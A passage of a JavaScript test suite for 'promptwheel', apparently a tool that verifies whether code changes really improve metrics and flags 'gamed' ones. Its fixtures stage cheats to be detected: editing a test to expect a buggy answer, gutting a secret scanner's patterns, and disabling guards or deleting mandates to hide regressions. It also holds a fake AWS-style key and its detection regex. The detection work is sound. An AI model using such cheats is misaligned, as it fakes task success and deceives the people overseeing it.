  const mine = join(tmp, `promptwheel-${ownerTag(d)}-ORPHAN`);
  const legacy = join(tmp, 'promptwheel-ORPHAN');   // untagged: nothing says this engine made it
  for (const p of [mine, legacy]) mkdirSync(p);
  const old = new Date(Date.now() - 7200_000);     // 2h old: safely an orphan of THIS repo, not a live run
  utimesSync(mine, old, old);
  const day = new Date(Date.now() - 90_000_000);   // 25h old
  utimesSync(legacy, day, day);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  pwTmp(tmp, d, ['run', '--working', '--no-record']);       // any gate triggers selfHeal first
  assert.equal(existsSync(mine), false);            // this repo's abandoned checkout was removed
  assert.equal(existsSync(legacy), true);           // an untagged name is never removed, at any age
  for (const p of [tmp, d]) rmSync(p, { recursive: true, force: true });
});
test('self-heal: another repo\'s checkout survives for a day (mid-measurement for all we know), then is pruned as an orphan', () => {
  const tmp = mkdtempSync(join(tmpdir(), 'pw-heal-'));
  const d = tmpRepo([TODOS]);
  const other = join(tmp, 'promptwheel-0badc0de-OTHER1');    // some other repo, 2h old: maybe still measuring
  const stale = join(tmp, 'promptwheel-0badc0de-STALE1');    // the same tag, 25h old: a repo that was deleted or moved left it behind
  for (const p of [other, stale]) mkdirSync(p);
  const old = new Date(Date.now() - 7200_000);
  utimesSync(other, old, old);
  const day = new Date(Date.now() - 90_000_000);
  utimesSync(stale, day, day);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  pwTmp(tmp, d, ['run', '--working', '--no-record']);
  assert.equal(existsSync(other), true, 'a dir tagged for another repo must survive the first day');
  assert.equal(existsSync(stale), false, 'a day-old dir of another repo is an orphan nobody will claim: pruned');
  for (const p of [tmp, d]) rmSync(p, { recursive: true, force: true });
});

test('self-heal: a folder or another repo\'s worktree whose name only starts with promptwheel- survives at any age; a real leftover of a killed run is still removed', () => {
  const tmp = mkdtempSync(join(tmpdir(), 'pw-heal-'));
  const d = tmpRepo([TODOS]); writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  const other = tmpRepo([TODOS]); writeFileSync(join(other, 'app.js'), 'a\n'); commitAll(other, 'base');
  const notes = join(tmp, 'promptwheel-notes');                      // a person's own folder
  mkdirSync(notes); writeFileSync(join(notes, 'todo.txt'), 'mine\n');
  const otherWt = join(tmp, 'promptwheel-other-wt');                 // another repo's worktree, with uncommitted work
  execFileSync('git', ['worktree', 'add', '--quiet', '--detach', otherWt, 'HEAD'], { cwd: other });
  writeFileSync(join(otherWt, 'app.js'), 'uncommitted work\n');
  // near misses: the right prefix and tag with a tail mkdtemp never makes, a temp-index lookalike, an untagged name
  const lookalikes = [`promptwheel-${ownerTag(d)}-notes`, `promptwheel-${ownerTag(d)}-abc123-wt`, 'pw-idx-scratch', 'promptwheel-ORPHAN'].map((n) => join(tmp, n));
  for (const p of lookalikes) { mkdirSync(p); writeFileSync(join(p, 'keep.txt'), 'x\n'); }
  const file = join(tmp, `promptwheel-${ownerTag(d)}-aFile1`);       // the exact shape, but a file: the engine only makes directories
  writeFileSync(file, 'x\n');
  const leftover = mkdtempSync(join(tmp, `promptwheel-${ownerTag(d)}-`));   // named by mkdtemp, as a killed run leaves it
  const days = new Date(Date.now() - 5 * 86_400_000), hours = new Date(Date.now() - 7200_000);
  for (const p of [notes, otherWt, file, ...lookalikes]) utimesSync(p, days, days);
  utimesSync(leftover, hours, hours);                                // the documented age for this repo's unregistered checkout: one hour
  const r = pwTmp(tmp, d, ['run', '--working', '--no-record']);
  assert.equal(r.code, 0, r.out);
  assert.equal(existsSync(join(notes, 'todo.txt')), true, 'a plain folder named promptwheel-notes is not ours to remove');
  assert.equal(existsSync(join(otherWt, 'app.js')) && readFileSync(join(otherWt, 'app.js'), 'utf8'), 'uncommitted work\n', "another repo's worktree keeps its uncommitted work");
  for (const p of lookalikes) assert.equal(existsSync(join(p, 'keep.txt')), true, `${p} is not a name mkdtemp makes from the engine's prefix`);
  assert.equal(existsSync(file), true, 'a file is never removed');
  assert.equal(existsSync(leftover), false, 'the leftover of a killed run is removed after an hour');
  for (const p of [tmp, d, other]) rmSync(p, { recursive: true, force: true });
});

// ---------------------------------------- guardrail inheritance + observability
const reportOf = (out) => JSON.parse(out.slice(out.indexOf('{'), out.lastIndexOf('}') + 1));

test('extends: inherits a base config, local overrides by name', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-inh-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'base.json'), JSON.stringify({ metrics: [
    { name: 'tests', cmd: 'true', extract: 'exit', direction: 'pass', guard: true },
    { name: 'lint', cmd: 'echo 0', extract: 'number', direction: 'down', guard: true },
  ] }));
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: './base.json', metrics: [
    { name: 'lint', cmd: 'echo 0', extract: 'number', direction: 'down', guard: false }, // loosen inherited guard → info
    { name: 'cost', cmd: 'echo 1', extract: 'number', direction: 'down', guard: true },  // add a local guard
  ] }));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  const r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--json']);
  assert.notEqual(r.code, 64, r.out);
  const by = Object.fromEntries(reportOf(r.out).metrics.map((x) => [x.name, x]));
  assert.equal(by.tests.guard, true);   // inherited + enforced
  assert.equal(by.lint.guard, false);   // local override loosened it
  assert.equal(by.cost.guard, true);    // added locally
  rmSync(d, { recursive: true, force: true });
});

test('extends: a diamond (two bases sharing a grandparent) is NOT a false cycle', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-diamond-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'd.json'), JSON.stringify({ metrics: [{ name: 'base_m', cmd: 'echo 1', extract: 'number', direction: 'up', guard: true }] }));
  writeFileSync(join(d, 'b.json'), JSON.stringify({ extends: './d.json', metrics: [{ name: 'b_m', cmd: 'echo 1', extract: 'number', direction: 'up' }] }));
  writeFileSync(join(d, 'c.json'), JSON.stringify({ extends: './d.json', metrics: [{ name: 'c_m', cmd: 'echo 1', extract: 'number', direction: 'up' }] }));
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: ['./b.json', './c.json'], metrics: [{ name: 'local_m', cmd: 'echo 1', extract: 'number', direction: 'up' }] }));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  const r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--json']);
  assert.notEqual(r.code, 64, r.out); // diamond resolves, no false "cycle"
  const names = reportOf(r.out).metrics.map((x) => x.name);
  for (const n of ['base_m', 'b_m', 'c_m', 'local_m']) assert.ok(names.includes(n), `missing ${n}`);
  rmSync(d, { recursive: true, force: true });
});

test('extends: a real self-cycle still exits 64 (config error)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-cycle-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: './promptwheel.config.json', metrics: [{ name: 'm', cmd: 'echo 1', extract: 'number', direction: 'up' }] }));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  assert.equal(pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD']).code, 64); // true cycle caught
  rmSync(d, { recursive: true, force: true });
});

test("published tarball includes every file the CLI shells out to", () => {
  const out = execFileSync("npm", ["pack", "--dry-run", "--json"], {
    cwd: join(dirname(fileURLToPath(import.meta.url)), ".."), encoding: "utf8" });
  const files = JSON.parse(out)[0].files.map((f) => f.path);
  for (const f of ["packs/supply-chain/scan.mjs", "packs/supply-chain/lock.mjs"])
    assert.ok(files.includes(f), `${f} must ship in the tarball: init copies it and \`lock\` imports it`);
  assert.ok(files.includes("bin/promptwheel.d.ts"), "the type declarations must ship in the tarball");
});

// ---------------------------------------------------- types: the hand-written .d.ts tracks the runtime exports
test('types: bin/promptwheel.d.ts exists, declares every runtime export, and package.json points at it', async () => {
  const dtsPath = join(dirname(ENGINE), 'promptwheel.d.ts');
  assert.ok(existsSync(dtsPath), 'bin/promptwheel.d.ts is missing');
  const dts = readFileSync(dtsPath, 'utf8');
  const runtime = Object.keys(await import('../bin/promptwheel.mjs')).sort();
  assert.ok(runtime.length >= 16, `expected the engine's export list, got ${runtime.length}`);
  for (const name of runtime) {
    assert.match(dts, new RegExp(`^export declare (function|const) ${name}\\b`, 'm'), `promptwheel.d.ts does not declare the runtime export "${name}"`);
  }
  const pkg = JSON.parse(readFileSync(join(dirname(ENGINE), '..', 'package.json'), 'utf8'));
  assert.equal(pkg.types, './bin/promptwheel.d.ts');
  assert.equal(pkg.exports['.'].types, './bin/promptwheel.d.ts', 'the "." export must carry a types condition');
  assert.equal(pkg.exports['.'].default, './bin/promptwheel.mjs', 'the "." export must still resolve to the engine');
});

test("a guard whose command cannot run must NOT pass, cold eval scripts that are missing", () => {
  const d = mkdtempSync(join(tmpdir(), "pw-preset-"));
  const g = (a) => execFileSync("git", ["-C", d, ...a], { env: { ...process.env,
    GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });
  g(["init", "-q"]);
  writeFileSync(join(d, "a.js"), "let x = 1;\n");
  g(["add", "-A"]); g(["commit", "-q", "-m", "one"]);
  writeFileSync(join(d, "promptwheel.config.json"), JSON.stringify({ metrics: [
    { name: "eval_pass_rate", cmd: "node eval.mjs", extract: "number", direction: "up", guard: true },
    { name: "cost_per_run_usd", cmd: "node estimate-cost.mjs", extract: "number", direction: "down", guard: true },
  ] }));
  let out = "", code = 0;
  try {
    out = execFileSync(process.execPath, [ENGINE, "run", "--base", "HEAD", "--head", "HEAD"], { cwd: d, encoding: "utf8" });
  } catch (e) { code = e.status; out = `${e.stdout || ""}${e.stderr || ""}`; }
  assert.notEqual(code, 0, "missing eval scripts must not exit 0");
  assert.ok(!/verdict:\s*PASS/i.test(out), "must not report PASS: " + out.slice(-200));
});

test("gutting a pack copied into .promptwheel is GAMED, not an improvement", () => {
  const d = mkdtempSync(join(tmpdir(), "pw-game-"));
  const g = (a) => execFileSync("git", ["-C", d, ...a], { env: { ...process.env,
    GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });
  g(["init", "-q"]);
  writeFileSync(join(d, "app.js"), "const secret = 'AKIA1234567890ABCDEF';\n");
  g(["add", "-A"]); g(["commit", "-q", "-m", "base with a finding"]);
  mkdirSync(join(d, ".promptwheel", "packs", "scan"), { recursive: true });
  writeFileSync(join(d, ".promptwheel", "packs", "scan", "scan.mjs"),
    "import { readFileSync } from 'node:fs';\nconst { patterns } = JSON.parse(readFileSync(new URL('./patterns.json', import.meta.url), 'utf8'));\nconst text = readFileSync('app.js', 'utf8');\nconsole.log(patterns.filter((p) => new RegExp(p).test(text)).length);\n");
  writeFileSync(join(d, ".promptwheel", "packs", "scan", "patterns.json"), JSON.stringify({ patterns: ["AKIA[0-9A-Z]{16}"] }) + "\n");
  writeFileSync(join(d, "promptwheel.config.json"), JSON.stringify({ linkNodeModules: false, metrics: [
    { name: "findings", cmd: "node .promptwheel/packs/scan/scan.mjs", extract: "number", direction: "down", guard: true },
  ] }));
  g(["add", "-A"]); g(["commit", "-q", "-m", "wire the gate"]);
  // the cheat: gut the pattern database, touch nothing else
  writeFileSync(join(d, ".promptwheel", "packs", "scan", "patterns.json"),
    JSON.stringify({ patterns: [] }) + "\n");
  g(["add", "-A"]); g(["commit", "-q", "-m", "improve security posture"]);
  let out = "", code = 0;
  try {
    out = execFileSync(process.execPath,
      [ENGINE, "run", "--base", "HEAD~1", "--head", "HEAD", "--detect-gaming", "--json"],
      { cwd: d, encoding: "utf8" });
  } catch (e) { code = e.status; out = `${e.stdout || ""}`; }
  const rep = JSON.parse(out);
  assert.equal(rep.metrics[0].status, "improved", "the gutted scanner reads as a win, so the re-run has one to judge");
  assert.notEqual(rep.verdict, "pass", "pattern-gutting must not PASS: " + rep.verdict);
  assert.notEqual(code, 0, "exit must be nonzero");
});

// -------------------------------------------------------- integration: no-ai-tells preset
test('preset no-ai-tells: writes an em_dashes guard that regresses when an em-dash is added', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-emdash-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'doc.md'), 'clean prose, no tells here\n'); commitAll(d, 'base: clean');
  const init = pw(d, ['init', '--preset', 'no-ai-tells']);
  assert.equal(init.code, 0, init.out);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.ok(cfg.metrics.some((m) => m.name === 'em_dashes'), 'em_dashes guard present');
  commitAll(d, 'add the no-ai-tells gate');
  writeFileSync(join(d, 'doc.md'), 'clean prose, no tells here\nnow with an — em-dash\n'); commitAll(d, 'sneak in an em-dash');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /em_dashes|FAIL/);
  rmSync(d, { recursive: true, force: true });
});

// ======================================================================================
// Public library API + the Verified-Outcome Contract (INTEGRATE.md / CONTRACT.md)
// ======================================================================================

// ---------------------------------------------------------------- unit: Section 1 + vocab
test('verdictExitCode: the Section 1 verdict -> exit-code mapping', () => {
  assert.equal(verdictExitCode('pass'), 0);
  assert.equal(verdictExitCode('fail'), 1);
  assert.equal(verdictExitCode('gamed'), 2);
  assert.equal(verdictExitCode('inconclusive'), 3);
});
test('contract vocab exports are the fixed Section 2 sets', () => {
  assert.deepEqual([...VERDICTS], ['pass', 'fail', 'gamed', 'inconclusive']);
  assert.deepEqual([...DIRECTIONS], ['up', 'down', 'pass']);
  assert.deepEqual([...METRIC_STATUSES], ['improved', 'regressed', 'unchanged', 'inconclusive', 'unmeasurable']);
  assert.equal(CONTRACT_VERSION, '1');
});

// ---------------------------------------------------------- unit: conformsToContract
const validReport = () => ({
  base: 'a1b2c3d', head: 'e4f5g6h', mode: 'refs', repeat: 3, cohort: 'ci', verdict: 'pass',
  subsystems: ['api'],
  metrics: [{ name: 'tests_pass', direction: 'pass', guard: true, before: 1, after: 1, delta: 0, status: 'unchanged', ok: true, confidence: 'high', noise: 0 }],
});
test('conformsToContract: a well-formed Section 2 report conforms', () => {
  const r = conformsToContract(validReport());
  assert.equal(r.ok, true, r.errors.join('; '));
});
test('conformsToContract: rejects an unknown verdict', () => {
  const r = conformsToContract({ ...validReport(), verdict: 'green' });
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /verdict must be one of/);
});
test('conformsToContract: rejects a bad metric status and direction', () => {
  const rep = validReport(); rep.metrics[0].status = 'ok'; rep.metrics[0].direction = 'sideways';
  const r = conformsToContract(rep);
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /status must be one of/);
  assert.match(r.errors.join(' '), /direction must be one of/);
});
test('conformsToContract: a pass may not hide a guarded regression', () => {
  const rep = validReport(); rep.metrics[0].ok = false; // guard:true + ok:false but verdict stays pass
  const r = conformsToContract(rep);
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /guarded metric regressed/);
});
test('conformsToContract: a gamed verdict must point at a gamed metric', () => {
  const r = conformsToContract({ ...validReport(), verdict: 'gamed' });
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /no metric is gamed/);
});
test('conformsToContract: a non-object is rejected cleanly', () => {
  assert.equal(conformsToContract(null).ok, false);
  assert.equal(conformsToContract('x').ok, false);
});

// -------------------------------------------------------- integration: check() in process
test('check(): returns the Section 2 verdict in process and never exits (pass on a real fix)', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve in source');
  const report = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(report.verdict, 'pass', JSON.stringify(report.metrics));
  assert.equal(verdictExitCode(report.verdict), 0);
  assert.equal(conformsToContract(report).ok, true, conformsToContract(report).errors.join('; '));
  assert.equal(report.metrics.find((m) => m.name === 'todos').status, 'improved');
  rmSync(d, { recursive: true, force: true });
});
test('check(): verdict gamed when the win came from editing the test, not the source', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n'); // BUG: should be a - b
  writeFileSync(join(d, 'calc.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; import { sub } from './calc.mjs'; test('sub', () => assert.strictEqual(sub(5, 3), 2));\n");
  commitAll(d, 'base: red test, buggy source');
  writeFileSync(join(d, 'calc.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; import { sub } from './calc.mjs'; test('sub', () => assert.strictEqual(sub(5, 3), 8));\n");
  commitAll(d, 'game it: edit the test to expect the buggy answer');
  const report = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(report.verdict, 'gamed', JSON.stringify(report.metrics));
  assert.equal(verdictExitCode(report.verdict), 2);
  assert.ok(report.metrics.find((m) => m.gamed === true), 'a metric is flagged gamed');
  assert.equal(conformsToContract(report).ok, true, conformsToContract(report).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('check(): with auto:false throws (does not exit) on a missing config', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-nocfg-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'x.js'), '1\n'); commitAll(d, 'base');
  assert.throws(() => check({ repo: d, auto: false }), (e) => e.name === 'ConfigError' && e.exitCode === 64 && /no promptwheel\.config\.json/.test(e.message));
  // the other two preconditions carry the same name and code
  assert.throws(() => check({ repo: d, config: { metrics: [] } }), (e) => e.name === 'ConfigError' && e.exitCode === 64);
  const notRepo = mkdtempSync(join(tmpdir(), 'pw-norepo-'));
  assert.throws(() => check({ repo: notRepo }), (e) => e.name === 'ConfigError' && e.exitCode === 64 && /not inside a git repository/.test(e.message));
  rmSync(notRepo, { recursive: true, force: true });
  rmSync(d, { recursive: true, force: true });
});
test('check(): accepts an in-process config object (no config file needed)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-inlinecfg-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve');
  const report = check({ repo: d, base: 'HEAD~1', head: 'HEAD', config: { linkNodeModules: false, metrics: [TODOS] } });
  assert.equal(report.verdict, 'pass', JSON.stringify(report.metrics));
  assert.throws(() => check({ repo: d, config: { metrics: [] } }), /non-empty array/);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: gate integrity (Section 3)
test('gate integrity: disabling a guard to hide a regression reads GAMED', () => {
  const d = tmpRepo([TODOS]);                        // todos is a guard (direction down)
  writeFileSync(join(d, 'app.js'), 'clean\n'); commitAll(d, 'base: 0 TODOs, guard on');
  // head: ADD a regression (2 TODOs) AND disable the guard in the same diff
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ ...TODOS, guard: false }] }));
  commitAll(d, 'regress + disable the guard');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'gamed', JSON.stringify(r));
  assert.ok(r.gate && Array.isArray(r.gate.weakened) && r.gate.weakened.some((w) => w.name === 'todos'), 'gate weakening recorded');
  assert.notEqual(r.gate.fingerprint.base, r.gate.fingerprint.head);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('gate integrity: disabling a guard that was NOT regressing is not gaming (no false positive)', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\n'); commitAll(d, 'base: 1 TODO');
  // head: a real improvement in source (0 TODOs) AND retire the guard (legit config cleanup)
  writeFileSync(join(d, 'app.js'), 'clean\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ ...TODOS, guard: false }] }));
  commitAll(d, 'improve + retire the guard');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r));
  assert.ok(!r.gate.weakened, 'no weakening flagged when the dropped guard was not regressing');
  rmSync(d, { recursive: true, force: true });
});
test('gate integrity: fingerprint present, and identical when the gate is unchanged', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve, gate unchanged');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass');
  assert.equal(r.gate.fingerprint.base, r.gate.fingerprint.head, 'identical gate -> identical fingerprint');
  assert.match(r.gate.fingerprint.head, /^[0-9a-f]{16}$/);
  rmSync(d, { recursive: true, force: true });
});
test('gate integrity: deleting a guarded metric that regressed reads GAMED', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'clean\n'); commitAll(d, 'base: guard present');
  // head: regress AND remove the metric entirely from the config
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\nc // TODO\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ name: 'noop', cmd: 'echo 1', extract: 'number', direction: 'up', guard: false }] }));
  commitAll(d, 'regress + delete the guard metric');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'gamed', JSON.stringify(r));
  assert.ok(r.gate.weakened.some((w) => w.name === 'todos' && w.change === 'guard-removed'), 'removed guard recorded');
  rmSync(d, { recursive: true, force: true });
});

test('gate integrity: an unchanged mandate (local or inherited) yields identical fingerprints; a deleted mandate changes it and the report says so', () => {
  const MD = { name: 'no-secrets', paths: ['secrets.json'], reason: 'frozen' };
  const mk = (baseCfg, headCfg, extra = {}) => {
    const d = tmpRepo([TODOS]);
    for (const [f, c] of Object.entries(extra)) writeFileSync(join(d, f), JSON.stringify(c));
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(baseCfg));
    writeFileSync(join(d, 'secrets.json'), '{"v":1}\n'); writeFileSync(join(d, 'app.js'), 'x // TODO\n'); commitAll(d, 'base');
    writeFileSync(join(d, 'app.js'), 'x\n');                                   // a real source win, protected path untouched
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(headCfg));
    commitAll(d, 'head');
    return d;
  };
  // 1. same mandate at both refs -> same fingerprint, nothing flagged (this was FALSE in 0.7.4: base never collected mandates)
  let d = mk({ linkNodeModules: false, mandates: [MD], metrics: [TODOS] }, { linkNodeModules: false, mandates: [MD], metrics: [TODOS] });
  let r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass');
  assert.equal(r.gate.fingerprint.base, r.gate.fingerprint.head, 'unchanged mandate must not perturb the fingerprint');
  assert.ok(!r.gate.changed);
  rmSync(d, { recursive: true, force: true });
  // 1b. the same, with the mandate INHERITED through extends at both refs
  const inh = { linkNodeModules: false, extends: './base.json', metrics: [TODOS] };
  d = mk(inh, inh, { 'base.json': { mandates: [MD], metrics: [] } });
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.gate.fingerprint.base, r.gate.fingerprint.head, 'an inherited mandate resolves the same at base and head');
  assert.ok(!r.gate.changed);
  rmSync(d, { recursive: true, force: true });
  // 2. mandate quietly deleted at head -> different fingerprint, gate.changed, and the human report names it
  d = mk({ linkNodeModules: false, mandates: [MD], metrics: [TODOS] }, { linkNodeModules: false, mandates: [], metrics: [TODOS] });
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.notEqual(r.gate.fingerprint.base, r.gate.fingerprint.head, 'deleting a mandate must change the fingerprint (tamper-evident)');
  assert.equal(r.gate.changed, true);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  const cli = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.match(cli.out, /gate definition changed/);
  assert.match(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--markdown']).out, /Gate definition changed/);
  rmSync(d, { recursive: true, force: true });
});

test('mandates: deleting a mandate in the same change that violates it does not clear it (base mandates stay in force)', () => {
  const MD = { name: 'no-secrets', paths: ['secrets.json'], reason: 'frozen' };
  const mk = (touchProtected) => {
    const d = tmpRepo([TODOS]);
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, mandates: [MD], metrics: [TODOS] }));
    writeFileSync(join(d, 'secrets.json'), '{"v":1}\n'); writeFileSync(join(d, 'app.js'), 'x // TODO\n'); commitAll(d, 'base');
    writeFileSync(join(d, 'app.js'), 'x\n');
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [TODOS] }));   // mandate deleted at head
    if (touchProtected) writeFileSync(join(d, 'secrets.json'), '{"v":2}\n');
    commitAll(d, 'head');
    return d;
  };
  // the bypass: delete the rule and break it in one commit -> still FAIL, reported as removed, exit 1
  let d = mk(true);
  let r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'fail');
  assert.ok(r.mandates && r.mandates[0].name === 'no-secrets' && r.mandates[0].removed === true, JSON.stringify(r.mandates));
  assert.equal(r.gate.changed, true);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  const cli = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(cli.code, 1);
  assert.match(cli.out, /MANDATE "no-secrets" violated/);
  assert.match(cli.out, /deleted in this same change/);
  // without gaming detection the base mandates are still enforced
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD', detectGaming: false });
  assert.equal(r.verdict, 'fail');
  rmSync(d, { recursive: true, force: true });
  // retiring the mandate in its own change (protected path untouched): allowed, PASS, fingerprint change recorded
  d = mk(false);
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass');
  assert.ok(!r.mandates);
  assert.equal(r.gate.changed, true);
  rmSync(d, { recursive: true, force: true });
});

test('mandates: narrowing a mandate in the same change that violates it does not clear it (the base version stays in force, reported as edited)', () => {
  const mk = (touchProtected) => {
    const d = tmpRepo([TODOS]);
    mkdirSync(join(d, 'test', 'legacy'), { recursive: true });
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, mandates: [{ name: 'tests', paths: ['test/**'], reason: 'frozen' }], metrics: [TODOS] }));
    writeFileSync(join(d, 'test', 'a.js'), '1\n'); writeFileSync(join(d, 'test', 'legacy', 'b.js'), '1\n'); writeFileSync(join(d, 'app.js'), 'x // TODO\n'); commitAll(d, 'base');
    writeFileSync(join(d, 'app.js'), 'x\n');
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, mandates: [{ name: 'tests', paths: ['test/legacy/**'], reason: 'frozen' }], metrics: [TODOS] }));   // narrowed at head
    if (touchProtected) writeFileSync(join(d, 'test', 'a.js'), '2\n');   // outside the narrowed paths, inside the base ones
    commitAll(d, 'head');
    return d;
  };
  let d = mk(true);
  let r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'fail');
  assert.ok(r.mandates && r.mandates.length === 1 && r.mandates[0].name === 'tests' && r.mandates[0].edited === true && !r.mandates[0].removed, JSON.stringify(r.mandates));
  assert.deepEqual(r.mandates[0].files, ['test/a.js']);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  const cli = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(cli.code, 1);
  assert.match(cli.out, /MANDATE "tests" violated/);
  assert.match(cli.out, /edited in this same change/);
  rmSync(d, { recursive: true, force: true });
  // narrowing the rule in its own change (nothing protected touched): allowed, PASS, fingerprint change recorded
  d = mk(false);
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass');
  assert.ok(!r.mandates);
  assert.equal(r.gate.changed, true);
  rmSync(d, { recursive: true, force: true });
});

test('check(): a malformed config or a missing extends target throws a ConfigError (exitCode 64), never exits the host process', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'x\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'promptwheel.config.json'), '{ not json');
  assert.throws(() => check({ repo: d }), (e) => e.name === 'ConfigError' && e.exitCode === 64 && /invalid config/.test(e.message));
